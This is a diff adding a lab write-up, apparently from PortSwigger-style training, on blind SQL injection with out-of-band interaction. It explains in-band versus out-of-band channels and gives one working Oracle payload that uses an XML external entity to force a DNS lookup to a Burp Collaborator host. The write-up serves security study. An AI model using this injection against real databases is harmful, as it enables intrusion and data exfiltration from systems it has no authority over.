@@ -599,3 +599,41 @@ Blind SQLI : Where database doesn't show the error directly instead they will sh
 <img width="1177" height="591" alt="image" src="https://github.com/user-attachments/assets/b093de4a-d906-4bd8-a306-93e864e95552" />
 
 # ------------------------------------------------------------------------------
+
+
+# 15. Blind SQL injection with out-of-band interaction.
+
+<img width="752" height="209" alt="image" src="https://github.com/user-attachments/assets/803c1b44-9ed2-4082-b4be-d30ade05fff7" />
+
+### **Goal** : To exploit SQLI vulnerberalibility to cause a DNS lookup burp collaborator
+
+### **Ingrediants** : Same as above. 
+
+### **Solving** : 
+
+- In Band : The response comes through same communication channel Example : ' or 1=1-- it gives response as error or our desired value in the same channel.
+
+- Out of Band : The response comes through different communication channel Example : website response shows nothing useful later, when server makes a DNS request to your colloborator domain. 
+
+- These out of band interaction can be found by the dns look up where we change dns domain into IP address. Burp collobarator is used for the DNS lookup. 
+
+- We will use the script of DNS lookup to solve the lab. For that we have to find which database it is using first we will try with the oracle. 
+
+<img width="903" height="544" alt="image" src="https://github.com/user-attachments/assets/02a13391-0e65-4d03-9343-2e7637ecbabb" />
+
+<img width="1098" height="433" alt="image" src="https://github.com/user-attachments/assets/a4027829-7c45-4f11-8c31-e8232c0bada0" />
+
+- znqq13xw1e6byhtcwajivpysyj4as2gr.oastify.com This is the colloborator url. 
+  
+- Hence the script would be ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://znqq13xw1e6byhtcwajivpysyj4as2gr.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+
+<img width="1273" height="458" alt="image" src="https://github.com/user-attachments/assets/5e742ba6-4d46-4d64-91e6-018dcdf67d9e" />
+
+<img width="969" height="481" alt="image" src="https://github.com/user-attachments/assets/b2e45402-f125-4cf8-a6ff-724846c1f687" />
+
+<img width="1286" height="539" alt="image" src="https://github.com/user-attachments/assets/ea05d21b-b560-43bc-a612-14407a3b72e5" />
+
+- Hence by this we have solve the lab. 
+
+# ------------------------------------------------------------------------------
+
